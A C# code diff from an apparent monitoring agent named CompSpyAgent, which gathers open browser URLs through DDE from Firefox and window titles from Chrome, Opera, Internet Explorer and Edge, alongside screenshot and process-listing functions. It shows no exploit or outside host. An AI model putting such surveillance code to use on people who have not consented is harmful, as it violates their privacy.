@@ -8,6 +8,7 @@ using System.Windows.Forms;
 using System.Diagnostics;
 using System.Threading;
 using System.IO;
+using System.Windows;
 using NDde.Client;
 
 namespace CompSpyAgent
@@ -56,27 +57,65 @@ namespace CompSpyAgent
 
             //aktualizacja otwartych stron
             listaStron.Clear();
-            listaZPrzegladarki("Firefox");
-            //listaZPrzegladarki("firefox");
-            listaZPrzegladarki("chrome");
-            listaZPrzegladarki("opera");
+            getURLfirefox();
 
+            foreach(var p in listaProcesow)
+            {
+                if(Convert.ToString(p.ProcessName) == "chrome")
+                {
+                    if(p.MainWindowTitle != "" || p.MainWindowTitle == " ")
+                    {
+                        listaStron.Add("[chrome]");
+                        listaStron.Add("Title: " + p.MainWindowTitle);
+                    }
+                   
+                }
+
+                if (Convert.ToString(p.ProcessName) == "opera")
+                {
+                    if (p.MainWindowTitle != "" || p.MainWindowTitle == " ")
+                    {
+                        listaStron.Add("[opera]");
+                        listaStron.Add("Title: " + p.MainWindowTitle);
+                    }
+                }
+
+                if (Convert.ToString(p.ProcessName) == "iexplore")
+                {
+                    if (p.MainWindowTitle != "" || p.MainWindowTitle == " ")
+                    {
+                        listaStron.Add("[iexplore]");
+                        listaStron.Add("Title: " + p.MainWindowTitle);
+                    }
+                }
+
+                if (Convert.ToString(p.ProcessName) == "MicrosoftEdge")
+                {
+                    if (p.MainWindowTitle != "" || p.MainWindowTitle == " ")
+                    {
+                        listaStron.Add("[MicrosoftEdge]");
+                        listaStron.Add("Title: " + p.MainWindowTitle);
+                    }
+                }
+
+
+            }
 
 
 
 
         } 
-        public void listaZPrzegladarki(string przegladarka)
+        public void getURLfirefox()
         {
             try
             {
-                DdeClient dde = new DdeClient(przegladarka, "WWW_GetWindowInfo");
+                DdeClient dde = new DdeClient("firefox", "WWW_GetWindowInfo");
                 dde.Connect();
                 string url = dde.Request("URL", int.MaxValue);
                string[] urls = url.Split(new string[] { ",", "\"" }, StringSplitOptions.RemoveEmptyEntries);
                 dde.Disconnect();
 
-                listaStron.Add("[" + przegladarka + "]");
+                listaStron.Add("[firefox]");
                 listaStron.Add("URL: " + urls[0]);
                 listaStron.Add("Title: " + urls[1]);
 
@@ -86,6 +125,7 @@ namespace CompSpyAgent
 
             }
         }
+
 
         public void getZrzut(PictureBox p)
         {
@@ -114,7 +154,7 @@ namespace CompSpyAgent
                     return Convert.ToBase64String(bytes);
                 }
             }
-        }
+    }
 
         public void getListaProcesow(ListView lw)
         {
